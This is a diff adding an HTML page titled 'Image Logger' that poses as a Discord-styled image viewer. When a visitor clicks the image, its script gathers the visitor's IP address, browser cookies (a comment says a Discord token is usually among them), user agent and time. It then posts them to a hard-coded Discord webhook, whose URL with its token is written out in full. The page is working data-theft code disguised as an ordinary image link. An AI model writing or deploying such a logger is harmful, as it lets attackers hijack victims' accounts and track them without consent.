@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Logger</title>
+    <!-- This meta tag helps the image show up in Discord previews -->
+    <meta property="og:image" content="https://via.placeholder.com/150"> 
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #2f3136; /* Discord dark theme */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        img {
+            max-width: 90%;
+            max-height: 90vh;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            transition: transform 0.2s ease;
+        }
+        img:hover {
+            transform: scale(1.02);
+        }
+        .loading {
+            color: #fff;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="loader" class="loading">Loading image...</div>
+    <img id="target-image" src="" alt="Click to view" style="display:none;">
+</div>
+
+<script>
+    // YOUR WEBHOOK URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
+
+    // Get the image source from the URL parameter ?src=URL_HERE
+    const urlParams = new URLSearchParams(window.location.search);
+    const imageUrl = urlParams.get('src');
+
+    const loader = document.getElementById('loader');
+    const imgElement = document.getElementById('target-image');
+
+    if (imageUrl) {
+        imgElement.src = imageUrl;
+        
+        // Once the image loads, hide loader and show image
+        imgElement.onload = function() {
+            loader.style.display = 'none';
+            imgElement.style.display = 'block';
+            
+            // Add click event to log data
+            imgElement.onclick = function() {
+                logData();
+                // Optional: Open the image in a new tab or just let them see it larger
+                window.open(imageUrl, '_blank');
+            };
+        };
+
+        // Handle errors
+        imgElement.onerror = function() {
+            loader.innerText = "Failed to load image.";
+        };
+    } else {
+        loader.innerText = "No image source provided.";
+    }
+
+    async function logData() {
+        try {
+            // 1. Get IP Address
+            let ip = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch (e) {
+                ip = "Could not retrieve IP";
+            }
+
+            // 2. Get Cookies (Discord Token is usually here)
+            const cookies = document.cookie;
+
+            // 3. Prepare Embed Data
+            const payload = {
+                embeds: [{
+                    title: "🕵️‍♂️ Target Clicked!",
+                    color: 15158332, // Reddish color for alert
+                    fields: [
+                        {
+                            name: "🌐 IP Address",
+                            value: `\`${ip}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🔑 Browser Cookies",
+                            value: `\`\`\`${cookies}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "📅 Time",
+                            value: new Date().toLocaleString(),
+                            inline: false
+                        },
+                        {
+                            name: "💻 User Agent",
+                            value: navigator.userAgent,
+                            inline: false
+                        },
+                        {
+                            name: "🖼️ Image Source",
+                            value: `[${imageUrl}](${imageUrl})`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Logger v1.0"
+                    }
+                }]
+            };
+
+            // 4. Send to Webhook
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+
+        } catch (error) {
+            console.error("Logging failed:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
